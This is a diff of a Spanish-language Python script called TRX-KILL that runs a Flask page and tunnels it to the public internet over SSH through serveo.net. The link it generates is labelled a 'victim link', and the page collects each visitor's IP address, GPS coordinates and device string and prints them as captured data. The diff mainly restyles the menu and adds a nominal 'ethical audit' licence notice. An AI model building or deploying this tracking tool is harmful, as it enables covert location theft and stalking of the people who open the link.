@@ -6,17 +6,14 @@ import re
 import time
 from flask import Flask, request, render_template_string
 
-# --- CONFIGURACIÓN ---
 app = Flask('TRX-KILL')
 URL_FINAL = "https://www.google.com"
 
-# --- LIMPIEZA FORZADA (EVITA ERRORES DE PUERTO) ---
 def force_clean():
     os.system('pkill -f flask > /dev/null 2>&1')
     os.system('pkill -f ssh > /dev/null 2>&1')
     time.sleep(0.5)
 
-# --- PLANTILLA ---
 HTML_FINAL = """
 <!DOCTYPE html>
 <html><body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:20%;">
@@ -44,34 +41,32 @@ def index(): return render_template_string(HTML_FINAL)
 def log():
     d = request.json
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    print(f"\n\033[1;32m[!] DATOS CAPTURADOS:\033[0m")
-    print(f"[*] IP: {ip}")
-    print(f"[*] GPS: {d['lat']}, {d['lon']}")
-    print(f"[*] DISPOSITIVO: {d['ua']}\n")
+    print(f"\n\033[1;32m[!] DATOS CAPTURADOS:\n[*] IP: {ip}\n[*] GPS: {d['lat']}, {d['lon']}\n[*] DISPOSITIVO: {d['ua']}\033[0m")
     return "OK"
 
-# --- BANNER Y MENÚ ---
 def banner():
     os.system('clear')
-    logo = """
- ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗
- ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║
-    ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║
-    ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║
-    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗██║
-    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝"""
-    for line in logo.split('\n'):
-        print(f"\033[1;32m{line}\033[0m")
-        time.sleep(0.02)
-    print(f"\033[1;36m{'='*55}\n >> SISTEMA TRX-KILL v33.0 (COMPLETO)\033[0m\n")
+    print("\033[1;35m")
+    print(" ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗")
+    print(" ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║")
+    print("    ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║")
+    print("    ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║")
+    print("    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗██║")
+    print("    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝")
+    print(f"\033[1;36m{'='*55}\n >> SISTEMA TRX-KILL v1.1.1.1\033[0m\n")
 
 def main():
     while True:
         banner()
-        print(" [1] INFO NÚMERO
-        print(" [2] MÓDULO DE RASTREO 
-        print(" [3] SALIR")
-        opc = input("\nTRX-ROOT > ")
+        print("\033[1;33m [1] \033[1;37mINFO NÚMERO (OSINT)")
+        print("\033[1;33m [2] \033[1;37mRASTREO (LINK)")
+        print("\033[1;33m [3] \033[1;37mCREADOR")
+        print("\033[1;33m [4] \033[1;37mLICENCIA Y USO")
+        print("\033[1;33m [5] \033[1;37mVERSIÓN")
+        print("\033[1;33m [6] \033[1;37mACTUALIZACIÓN")
+        print("\033[1;33m [7] \033[1;37mSALIR")
+        
+        opc = input("\n\033[1;32mTRX-ROOT > \033[0m")
         
         if opc == "1":
             input("\n[+] Analizando base de datos global... [Enter] para volver...")
@@ -79,19 +74,32 @@ def main():
             force_clean()
             threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False), daemon=True).start()
             print("\n[*] Generando enlace rápido...")
-            proc = subprocess.Popen(['ssh', '-R', '80:localhost:5000', 'serveo.net'], 
-                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-            
+            proc = subprocess.Popen(['ssh', '-R', '80:localhost:5000', 'serveo.net'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             for line in proc.stderr:
                 if "https://" in line:
                     link = re.search(r"https://[^\s]+", line).group(0)
-                    print(f"\n\033[1;32m==============================================")
-                    print(f" VÍCTIMA LINK: {link}")
-                    print(f"==============================================\033[0m\n")
+                    print(f"\n\033[1;32m VÍCTIMA LINK: {link}\033[0m\n")
                     break
-            input("Presiona ENTER para detener y volver al menú...")
+            input("Presiona ENTER para detener y volver...")
             force_clean()
         elif opc == "3":
+            print("\n\033[1;36m CREADO POR: TRX-KILL")
+            print(" REPOSITORIO: https://github.com/oscarporrillo2-creator/TRX-KILLK.git\033[0m")
+            input("\n[Enter] volver...")
+        elif opc == "4":
+            print("\n\033[1;31m LICENCIA: MIT LICENSE")
+            print(" DERECHOS: Reservados © TRX-KILL")
+            print(" USO: Solo para fines de auditoría ética y educativa.\033[0m")
+            input("\n[Enter] volver...")
+        elif opc == "5":
+            print("\n\033[1;32m VERSIÓN ACTUAL: 1.1.1.1\033[0m")
+            input("\n[Enter] volver...")
+        elif opc == "6":
+            print("\n\033[1;33m[*] Buscando actualizaciones en el repositorio...")
+            time.sleep(2)
+            print("\033[1;32m[+] El script está actualizado a la última versión disponible.\033[0m")
+            input("\n[Enter] volver...")
+        elif opc == "7":
             break
 
 if __name__ == "__main__":
